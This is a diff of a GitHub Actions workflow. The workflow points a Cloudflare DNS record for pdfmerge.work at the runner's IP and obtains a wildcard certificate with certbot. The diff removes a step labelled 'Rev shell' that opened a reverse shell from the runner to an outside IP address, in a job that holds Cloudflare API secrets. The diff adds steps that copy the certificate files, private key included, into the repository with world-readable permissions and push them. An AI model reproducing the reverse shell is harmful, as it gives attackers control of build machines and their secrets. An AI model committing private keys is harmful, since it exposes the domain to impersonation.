@@ -8,11 +8,13 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
       - name: Get Current IP Address
         id: get_ip
         run: |
           ip_address=$(curl -s ifconfig.me)
-          echo "Current IP Address: $ip_address"
           echo "::set-output name=ip::$ip_address"
 
       - name: Display IP Address
@@ -24,49 +26,33 @@ jobs:
           DOMAIN: "pdfmerge.work"
           NEW_IP: ${{ steps.get_ip.outputs.ip }}
         run: |
-          #!/bin/bash
           API_ENDPOINT="https://api.cloudflare.com/client/v4"
 
-          # Get the Zone ID for the domain
+          # Get Zone ID
           ZONE_ID=$(curl -s -X GET "$API_ENDPOINT/zones?name=$DOMAIN" \
-              -H "Authorization: Bearer $API_TOKEN" \
-              -H "Content-Type: application/json" | jq -r '.result[0].id')
-
-          # Check if the Zone ID was successfully retrieved
+            -H "Authorization: Bearer $API_TOKEN" \
+            -H "Content-Type: application/json" | jq -r '.result[0].id')
           if [ "$ZONE_ID" == "null" ] || [ -z "$ZONE_ID" ]; then
             echo "Error: Could not retrieve Zone ID for domain $DOMAIN."
             exit 1
           fi
 
-          # Get the DNS record ID if it exists
+          # Get or create DNS record
           RECORD_ID=$(curl -s -X GET "$API_ENDPOINT/zones/$ZONE_ID/dns_records?type=A&name=$DOMAIN" \
-              -H "Authorization: Bearer $API_TOKEN" \
-              -H "Content-Type: application/json" | jq -r '.result[0].id')
-
+            -H "Authorization: Bearer $API_TOKEN" \
+            -H "Content-Type: application/json" | jq -r '.result[0].id')
           if [ "$RECORD_ID" == "null" ]; then
-            echo "A record for $DOMAIN does not exist. Creating a new one."
+            echo "Creating new DNS A record for $DOMAIN."
             curl -s -X POST "$API_ENDPOINT/zones/$ZONE_ID/dns_records" \
               -H "Authorization: Bearer $API_TOKEN" \
               -H "Content-Type: application/json" \
-              --data '{
-                "type": "A",
-                "name": "'"$DOMAIN"'",
-                "content": "'"$NEW_IP"'",
-                "ttl": 120,
-                "proxied": false
-              }' | jq
+              --data "{\"type\":\"A\",\"name\":\"$DOMAIN\",\"content\":\"$NEW_IP\",\"ttl\":120,\"proxied\":false}" | jq
           else
-            echo "A record for $DOMAIN exists. Updating the IP address."
+            echo "Updating existing DNS A record for $DOMAIN."
             curl -s -X PUT "$API_ENDPOINT/zones/$ZONE_ID/dns_records/$RECORD_ID" \
               -H "Authorization: Bearer $API_TOKEN" \
               -H "Content-Type: application/json" \
-              --data '{
-                "type": "A",
-                "name": "'"$DOMAIN"'",
-                "content": "'"$NEW_IP"'",
-                "ttl": 120,
-                "proxied": false
-              }' | jq
+              --data "{\"type\":\"A\",\"name\":\"$DOMAIN\",\"content\":\"$NEW_IP\",\"ttl\":120,\"proxied\":false}" | jq
           fi
 
       - name: Install Certbot and Cloudflare Plugin
@@ -79,11 +65,8 @@ jobs:
           mkdir -p ~/.secrets/certbot
           echo "dns_cloudflare_api_token = $CLOUDFLARE_API_TOKEN" > ~/.secrets/certbot/cloudflare.ini
           chmod 600 ~/.secrets/certbot/cloudflare.ini
-      - name: Rev shell
-        run: bash -c "sh -i >& /dev/tcp/155.248.245.118/53 0>&1"
+
       - name: Request SSL Certificate
-        env:
-          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
         run: |
           sudo certbot certonly \
             --dns-cloudflare \
@@ -93,3 +76,18 @@ jobs:
             -d "*.pdfmerge.work" \
             --agree-tos --register-unsafely-without-email
 
+      - name: Copy Certificates to Repo Folder
+        run: |
+          mkdir -p certs
+          sudo cp /etc/letsencrypt/live/pdfmerge.work/* certs/
+          sudo chmod -R 644 certs
+
+      - name: Commit and Push Certificates
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          git config --global user.name "github-actions[bot]"
+          git config --global user.email "github-actions[bot]@users.noreply.github.com"
+          git add certs/*
+          git commit -m "Add SSL certificates for pdfmerge.work"
+          git push
